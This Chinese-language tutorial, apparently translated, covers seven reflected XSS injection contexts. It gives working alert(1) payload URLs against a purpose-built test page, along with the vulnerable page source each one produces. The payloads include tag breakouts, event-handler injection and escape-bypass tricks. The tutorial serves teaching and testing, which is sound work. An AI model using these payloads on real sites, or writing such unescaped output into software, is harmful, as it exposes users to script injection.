在阅读XSS的相关文章时，我们通常会看到经典的弹窗payload， `<script>alert(1)</script>`。虽然是正确的，但有点局限，不足以让新手应对不同的真实场景。

这里有7个案例，每个人都应该知道的XSS利用场景。 

`http://brutelogic.com.br/xss.php`这个就是测试环境。

在源代码的开头，有一个HTML注释，其中包含触发每个案例的所有参数。所有这些都适用于GET和POST请求。

你可能会注意到，所有的案例都可以在HTTP响应的源码中看到输入的payload。独立于反射型和存储型，这里最重要的是展示允许时输出的情况。为了方便，使用反射型作为案例。基于DOM型的XSS不在此讨论范围内。

请记住不要在有XSS过滤机制的浏览器中测试其案例，要在火狐中测试。

**1.URL 反射型**

当URL以某种方式反映在源代码中时，我们可以向其添加我们自己的 `XSS payload`。对于PHP页面，可以使用斜杠字符（/）在页面名称之后添加任何内容（不更改它）。

> 1.  `http://brutelogic.com.br/xss.php/”><svg onload=alert(1)>`
>     

需要使用 `">`来闭合标签，以便插入新的标签，来执行 `payload`。

```
1.  `<!-- URL Reflection -->  `
    
2.  `<form action="/xss.php/"><svg onload=alert(1)>" method="POST">  `
    
3.  `<br>`
    
```

不同的语言会有不同的原因(反射型XSS可能出现在URL路径中或参数中)，对PHP语言而言，罪魁祸首是在提交表单字段的全局变量 `$_SERVER[“PHP_SELF”]`中。

**2\. 简单的HTMLi(HTML注入)**

最简单直接的一种XSS，直接在标签里面，在标签之前或后面不需要闭合或逃逸任何的字符。任何的XSS payload都可以成功利用。( `<taghandler=jsCode>` )

`http://brutelogic.com.br/xss.php?a=<svg onload=alert(1)>`

页面源码。

```
1.  `<!-- Simple HTMLi -->  `
    
2.  `Hello, <svg onload=alert(1)>!  `
    
3.  `<br>`
    
```

**3\. 内联 HTMLi**

和上一个一样简单，但是在标签内插入，需要 `">`来闭合一下标签。

`http://brutelogic.com.br/xss.php?b1="><svg onload=alert(1)>`

页面源码。

```
1.  `<!-- Inline HTMLi (Double Quotes) -->  `
    
2.  `<input type="text" name="b1" value=""><svg onload=alert(1)>">  `
    
3.  `<br>`
    
```

**4\. 内联HTMLi：不破坏标签**

当输入的大括号被转义的时候，我们就不能像上一个那样来闭合当前的标签了。

```
1.  `<!-- Inline HTMLi - No Tag Breaking (Double Quotes) -->  `
    
2.  `<input type="text" name="b3" value=""&gt;<svg onload=alert(1)&gt;">  `
    
3.  `<br>`
    
```

这个时候需要使用一个on事件的 `payload`来利用这个 `XSS`。

`http://brutelogic.com.br/xss.php?b3=" onmouseover=alert(1)//`

通过页面源码可以看到，闭合了value的值，并为 `onmouseover`事件处理程序提供了空间，指向了 `alert(1)`,后面的的 `//`注释掉 `">`。当受害者在受影响的字段点击鼠标的时候会触发 `JS`弹窗。

```
1.  `<!-- Inline HTMLi - No Tag Breaking (Double Quotes) -->  `
    
2.  `<input type="text" name="b3" value="" onmouseover=alert(1)//">  `
    
3.  `<br>`
    
```

**5\. Js中的HTMLi**

输入有时会在 `javascript`中(script 标签)，通常在代码的某个变量的值中。

但是HTML标签在浏览器的解析中具有优先权，所以我们先终止标签再插入新的标签。

`http://brutelogic.com.br/xss.php?c1=</script><svg onload=alert(1)>`

```
1.  `<script>  `
    
2.  ` // HTMLi in Js Block (Single Quotes)  `
    
3.  ` var c1 = '</script><svg onload=alert(1)>';`
    
```

**6\. 简单的Js注射**

如果 `script`标签被过滤掉了，上一个利用方式将会失败。

```
1.  `// Simple Js Injection  `
    
2.  ` var var3 = '><svg onload=alert(1)>';`
    
```

所以需要注入 `javascript`代码，尊重语法。

将易受攻击的变量的值连接到我们想要执行的 `payload`中。不让引号起作用，那就闭合。连接到我们的代码（带减号），然后反向（连接然后插入引号）以获得有效的javascript语法。

`http://brutelogic.com.br/xss.php?c3='-alert(1)-'`

```
1.  `// Simple Js Injection (Single Quotes)  `
    
2.  ` var c3 = ''-alert(1)-'';`
    
```

**7\. 逃逸Js注入**

在上一中情况中，如果单引号被反斜杠转义了，则注入的 `payload`将不起作用。

```
1.  `// Simple Js Injection (Single Quotes)  `
    
2.  ` var c3 = '\'-alert(1)-\'';`
    
```

对于这个问题，有一个小技巧，转义转义字符。插入一个反斜杠来逃避程序的转义字符，单引号将能闭合。在连接我们的JS代码之后，使用注释符来注释其余部分。

`http://brutelogic.com.br/xss.php?c5=\'-alert(1)//`

```
1.  `// Escaped Js Injection (Single Quotes)  `
    
2.  ` var c5 = '\\'-alert(1)//';`
    
```
